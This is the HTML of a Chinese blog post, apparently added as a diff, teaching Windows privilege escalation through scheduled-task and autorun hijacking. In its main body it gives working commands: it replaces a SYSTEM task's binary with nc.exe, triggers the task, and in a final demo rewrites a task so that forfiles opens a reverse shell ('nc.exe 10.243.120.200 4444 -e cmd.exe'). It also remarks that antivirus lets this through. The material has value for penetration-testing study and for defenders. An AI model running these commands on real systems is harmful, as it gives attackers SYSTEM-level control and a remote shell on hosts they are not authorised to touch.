@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="VnNixUxQwNBvFc-nAdXdfYkKhdk4ncl53flMSHEm1gw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="前言：“服务提权（第三章）”是我们主动去忽悠系统管家帮我们办事。而“计划任务（Scheduled Tasks）”与“启动项（Autoruns）”提权，则是我们在必经之路上挖好坑，等着高权限用户（或系统自己）按时走过来踩进去。 这两者的本质依然是：找高权限运行的程序 -&gt; 检查我们能不能篡改它 -&gt; 替换成木马 -&gt; 等待触发。 一、计划任务劫持企业环境里，管理员经常会设置一些定时">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows提权6：计划任务与启动项">
+<meta property="og:url" content="http://example.com/2026/03/21/ISW/Win%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Win%E6%8F%90%E6%9D%836_%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E4%B8%8E%E5%90%AF%E5%8A%A8%E9%A1%B9/index.html">
+<meta property="og:site_name" content="s0m1ng">
+<meta property="og:description" content="前言：“服务提权（第三章）”是我们主动去忽悠系统管家帮我们办事。而“计划任务（Scheduled Tasks）”与“启动项（Autoruns）”提权，则是我们在必经之路上挖好坑，等着高权限用户（或系统自己）按时走过来踩进去。 这两者的本质依然是：找高权限运行的程序 -&gt; 检查我们能不能篡改它 -&gt; 替换成木马 -&gt; 等待触发。 一、计划任务劫持企业环境里，管理员经常会设置一些定时">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/ISW/Win%E6%8F%90%E6%9D%83/6/LOLBAS.png">
+<meta property="article:published_time" content="2026-03-21T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-21T04:03:59.883Z">
+<meta property="article:author" content="s0m1ng">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="计划任务">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/ISW/Win%E6%8F%90%E6%9D%83/6/LOLBAS.png">
+
+<link rel="canonical" href="http://example.com/2026/03/21/ISW/Win%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Win%E6%8F%90%E6%9D%836_%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E4%B8%8E%E5%90%AF%E5%8A%A8%E9%A1%B9/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Windows提权6：计划任务与启动项 | s0m1ng</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="s0m1ng" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">s0m1ng</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">二进制学习中</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+  <a href="https://github.com/som1ng" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/21/ISW/Win%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Win%E6%8F%90%E6%9D%836_%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E4%B8%8E%E5%90%AF%E5%8A%A8%E9%A1%B9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/profile_photo.jpg">
+      <meta itemprop="name" content="s0m1ng">
+      <meta itemprop="description" content="学习逆向贵在坚持">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="s0m1ng">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Windows提权6：计划任务与启动项
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2026-03-21 12:00:00 / 修改时间：12:03:59" itemprop="dateCreated datePublished" datetime="2026-03-21T12:00:00+08:00">2026-03-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ISW/" itemprop="url" rel="index"><span itemprop="name">ISW</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ISW/Windows%E6%8F%90%E6%9D%83/" itemprop="url" rel="index"><span itemprop="name">Windows提权</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+  
+  <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>“服务提权（第三章）”是我们主动去忽悠系统管家帮我们办事。而“计划任务（Scheduled Tasks）”与“启动项（Autoruns）”提权，则是我们在必经之路上挖好坑，<strong>等着高权限用户（或系统自己）按时走过来踩进去。</strong></p>
+<p>这两者的本质依然是：<strong>找高权限运行的程序 -&gt; 检查我们能不能篡改它 -&gt; 替换成木马 -&gt; 等待触发。</strong></p>
+<h1 id="一、计划任务劫持"><a href="#一、计划任务劫持" class="headerlink" title="一、计划任务劫持"></a>一、计划任务劫持</h1><p>企业环境里，管理员经常会设置一些定时脚本：</p>
+<p>比如“每天凌晨 2 点用 SYSTEM 权限运行一次 <code>C:\Backup\backup.bat</code> 来清理日志”。这就是我们的提权跳板。</p>
+<h2 id="发现高价值目标"><a href="#发现高价值目标" class="headerlink" title="发现高价值目标"></a>发现高价值目标</h2><p>在实战中，<strong>首选永远是看 <code>WinPEAS</code> 的红色输出</strong>。如果你必须手工查（或者 WinPEAS 被杀了），可以使用以下命令寻找非系统自带的计划任务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看所有计划任务的详细信息（输出很多）</span></span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤技巧：找那些以 SYSTEM 身份运行的任务</span></span><br><span class="line">schtasks /query /fo LIST /v | findstr /i <span class="string">&quot;TaskToRun RunAs&quot;</span> | findstr /i <span class="string">&quot;SYSTEM&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>假设你发现了一个任务：每天运行 <code>C:\Tasks\cleanup.exe</code>，运行身份是 <code>NT AUTHORITY\SYSTEM</code>。立刻拿着这个路径去查权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls <span class="string">&quot;C:\Tasks\cleanup.exe&quot;</span></span><br></pre></td></tr></table></figure>
+<p>如果你看到 <code>BUILTIN\Users:(M)</code> 或 <code>(W)</code> 或 <code>(F)</code>，<strong>说明可以打</strong></p>
+<h2 id="触发exp"><a href="#触发exp" class="headerlink" title="触发exp"></a>触发exp</h2><p>把你的反弹 Shell 武器（比如 <code>nc.exe</code> 或者一个恶意的 <code>.bat</code> 脚本）覆盖掉原文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份原文件是个好习惯</span></span><br><span class="line">move C:\Tasks\cleanup.exe C:\Tasks\cleanup.exe.bak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把你的木马放进去</span></span><br><span class="line">copy C:\Windows\Temp\nc.exe C:\Tasks\cleanup.exe</span><br></pre></td></tr></table></figure>
+<p><strong>触发方式</strong>：</p>
+<ol>
+<li><p><strong>等</strong>：如果是每 5 分钟执行一次，你在 Ubuntu 里敲好 <code>nc -lvnp 4444</code> 等它自己弹回来。</p>
+</li>
+<li><p><strong>强行触发</strong>：有时候你运气极好，普通用户也有权手动启动这个任务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /tn <span class="string">&quot;那个任务的名字&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h1 id="二、-启动项-Autoruns-劫持"><a href="#二、-启动项-Autoruns-劫持" class="headerlink" title="二、 启动项 (Autoruns) 劫持"></a>二、 启动项 (Autoruns) 劫持</h1><p>启动项指的是电脑开机、或某个用户登录桌面时会自动运行的程序。如果管理员配置了一个每次开机都会以高权限运行的辅助工具，且你对其有写权限，就能利用。</p>
+<h2 id="查启动项注册表"><a href="#查启动项注册表" class="headerlink" title="查启动项注册表"></a>查启动项注册表</h2><p>Windows 的自动启动程序大多记录在注册表里。重点查这几个键值：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 机器级别的启动项（所有用户登录都会触发）</span></span><br><span class="line">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果是64位系统，别忘了查32位的注册表项</span></span><br><span class="line">reg query HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
+<h2 id="验证与替换"><a href="#验证与替换" class="headerlink" title="验证与替换"></a>验证与替换</h2><ol>
+<li><p>观察上面的输出，找到非 <code>C:\Windows\System32\</code> 下的第三方程序路径（比如 <code>C:\Tools\SysMonitor.exe</code>）。</p>
+</li>
+<li><p>用老套路跑一遍 <code>icacls &quot;C:\Tools\SysMonitor.exe&quot;</code>。</p>
+</li>
+<li><p>如果可写，覆盖替换为木马。</p>
+</li>
+</ol>
+<h1 id="三、-计划任务与LOLBAS配合"><a href="#三、-计划任务与LOLBAS配合" class="headerlink" title="三、 计划任务与LOLBAS配合"></a>三、 计划任务与LOLBAS配合</h1><p>在最高端的实战对抗中，你查到的高权限计划任务，执行的往往<strong>不是</strong>第三方脚本，而是<strong>系统自带的合法程序</strong>。</p>
+<h2 id="看到什么特征才去查-LOLBAS？"><a href="#看到什么特征才去查-LOLBAS？" class="headerlink" title="看到什么特征才去查 LOLBAS？"></a>看到什么特征才去查 LOLBAS？</h2><p>你<strong>绝对不需要</strong>挨个去查所有的 exe。在实战中，只有当<strong>以下三个条件同时满足</strong>时，你的脑子里才应该去找利用payload：</p>
+<p><strong>特征 1：目标是微软系统原生物件</strong></p>
+<ul>
+<li><p>你看了一眼路径，它是 <code>C:\Windows\System32\</code>、<code>C:\Windows\SysWOW64\</code> 或者 <code>C:\Windows\Microsoft.NET\</code> 下的程序（比如 <code>forfiles.exe</code>, <code>certutil.exe</code>, <code>msxsl.exe</code>, <code>bash.exe</code>）。</p>
+</li>
+<li><p><strong>说明</strong>：如果是 <code>C:\Program Files\某个国产软件\a.exe</code>，查 LOLBAS 没用，它不收录第三方软件。</p>
+</li>
+</ul>
+<p><strong>特征 2：文件本身不可写</strong></p>
+<ul>
+<li><p>跑了 <code>icacls &quot;C:\Windows\System32\forfiles.exe&quot;</code>，发现普通用户只有 <code>(RX)</code> 权限。</p>
+</li>
+<li><p><strong>说明</strong>：路被堵死了，传统的“替换 exe”打法失效。</p>
+</li>
+</ul>
+<p><strong>特征 3：你可以控制它的参数或配置文件</strong> 这是最核心的条件。</p>
+<p>虽然文件改不了,但你发现：</p>
+<ul>
+<li><p><strong>能改参数</strong>：你发现你对这个计划任务对象本身有 <code>Change</code> 权限。你可以用 <code>schtasks /change</code> 把原本的 <code>forfiles /p c:\</code> 改成你想要的恶意exe参数。</p>
+</li>
+<li><p><strong>能改它读取的文件</strong>：你发现任务执行的是 <code>msxsl.exe C:\config.xml C:\style.xsl</code>。虽然 <code>msxsl.exe</code> 改不了，但你去跑了下 <code>icacls</code> 发现，那个 <code>C:\style.xsl</code> 文件你<strong>可写</strong></p>
+</li>
+<li><p><strong>如何知道能不能修改参数？（针对计划任务）</strong> 我们使用 <code>schtasks /change</code> 篡改参数，<strong>并不是</strong>去修改 <code>forfiles.exe</code> 这个程序本身（你也改不了它，它是受保护的系统组件）。我们是去修改”<strong>系统清理任务</strong>“ 这个计划任务本身的配置。在 Windows 里，计划任务其实是以 XML 文件的形式存在 <code>C:\Windows\System32\Tasks\</code> 目录下的。你怎么知道自己能不能改这个任务？</p>
+<ol>
+<li><p><strong>自动化检测</strong>：<strong>WinPEAS</strong> 扫完后，如果发现普通用户对某个高权限任务拥有 <code>Modify</code> 权限，它会直接用<strong>红色</strong>在终端里警告你</p>
+</li>
+<li><p><strong>手工检测</strong>：你可以用 <code>icacls &quot;C:\Windows\System32\Tasks\系统清理任务&quot;</code> 去查权限，如果有 <code>(M)</code> 或 <code>(W)</code> 或 <code>(F)</code>，说明你可以敲 <code>schtasks /change</code> 命令来篡改它的参数。</p>
+</li>
+</ol>
+</li>
+<li><p><strong>如何知道能不能写文件？（针对配置文件）</strong> 和之前一样用 <code>icacls</code> 命令</p>
+</li>
+</ul>
+<h2 id="实战演示："><a href="#实战演示：" class="headerlink" title="实战演示："></a>实战演示：</h2><p>当你满足上述公式，打开 LOLBAS 网站搜索 <code>forfiles.exe</code>，知识库会直接把答案喂到你嘴边：</p>
+<blockquote>
+<p>_LOLBAS 提示：<code>forfiles</code> 的 <code>/c</code> 参数可以用来执行任意系统命令。_</p>
+</blockquote>
+<p><img data-src="/images/ISW/Win提权/6/LOLBAS.png" alt="LOLBAS"></p>
+<p>于是你直接敲命令篡改任务参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 严格对齐 LOLBAS 格式，将 calc.exe 替换为我们的木马</span></span><br><span class="line">schtasks /change /tn <span class="string">&quot;系统清理任务&quot;</span> /tr <span class="string">&quot;forfiles.exe /p c:\windows\system32 /m notepad.exe /c \&quot;cmd /c C:\Windows\Temp\nc.exe 10.243.120.200 4444 -e cmd.exe\&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>当下一次任务触发时，Windows 杀软一看是系统自带的程序在运行，直接绿灯放行；殊不知它已经在参数的驱使下，把你的反弹 Shell 悄悄拉了起来。</p>
+
+
+
+    
+    
+    
+        <div class="reward-container">
+  <div>您的支持将鼓励我继续创作!</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/reward.jpg" alt="s0m1ng 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>s0m1ng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2026/03/21/ISW/Win%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Win%E6%8F%90%E6%9D%836_%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E4%B8%8E%E5%90%AF%E5%8A%A8%E9%A1%B9/" title="Windows提权6：计划任务与启动项">http://example.com/2026/03/21/ISW/Win本地提权/Win提权6_计划任务与启动项/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+              <a href="/tags/Windows/" rel="tag"><i class="fa fa-tag"></i> Windows</a>
+              <a href="/tags/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/" rel="tag"><i class="fa fa-tag"></i> 计划任务</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/03/21/ISW/Win%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Win%E6%8F%90%E6%9D%835_%E5%86%85%E6%A0%B8/" rel="prev" title="Windows提权5：内核漏洞">
+      <i class="fa fa-chevron-left"></i> Windows提权5：内核漏洞
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8A%AB%E6%8C%81"><span class="nav-number">2.</span> <span class="nav-text">一、计划任务劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0%E9%AB%98%E4%BB%B7%E5%80%BC%E7%9B%AE%E6%A0%87"><span class="nav-number">2.1.</span> <span class="nav-text">发现高价值目标</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞验证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91exp"><span class="nav-number">2.3.</span> <span class="nav-text">触发exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81-%E5%90%AF%E5%8A%A8%E9%A1%B9-Autoruns-%E5%8A%AB%E6%8C%81"><span class="nav-number">3.</span> <span class="nav-text">二、 启动项 (Autoruns) 劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="nav-number">3.1.</span> <span class="nav-text">查启动项注册表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E4%B8%8E%E6%9B%BF%E6%8D%A2"><span class="nav-number">3.2.</span> <span class="nav-text">验证与替换</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E4%B8%8ELOLBAS%E9%85%8D%E5%90%88"><span class="nav-number">4.</span> <span class="nav-text">三、 计划任务与LOLBAS配合</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9C%8B%E5%88%B0%E4%BB%80%E4%B9%88%E7%89%B9%E5%BE%81%E6%89%8D%E5%8E%BB%E6%9F%A5-LOLBAS%EF%BC%9F"><span class="nav-number">4.1.</span> <span class="nav-text">看到什么特征才去查 LOLBAS？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E6%BC%94%E7%A4%BA%EF%BC%9A"><span class="nav-number">4.2.</span> <span class="nav-text">实战演示：</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="s0m1ng"
+      src="/images/profile_photo.jpg">
+  <p class="site-author-name" itemprop="name">s0m1ng</p>
+  <div class="site-description" itemprop="description">学习逆向贵在坚持</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">28</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">61</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=1327470638&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;1327470638&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fab fa-qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">s0m1ng</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
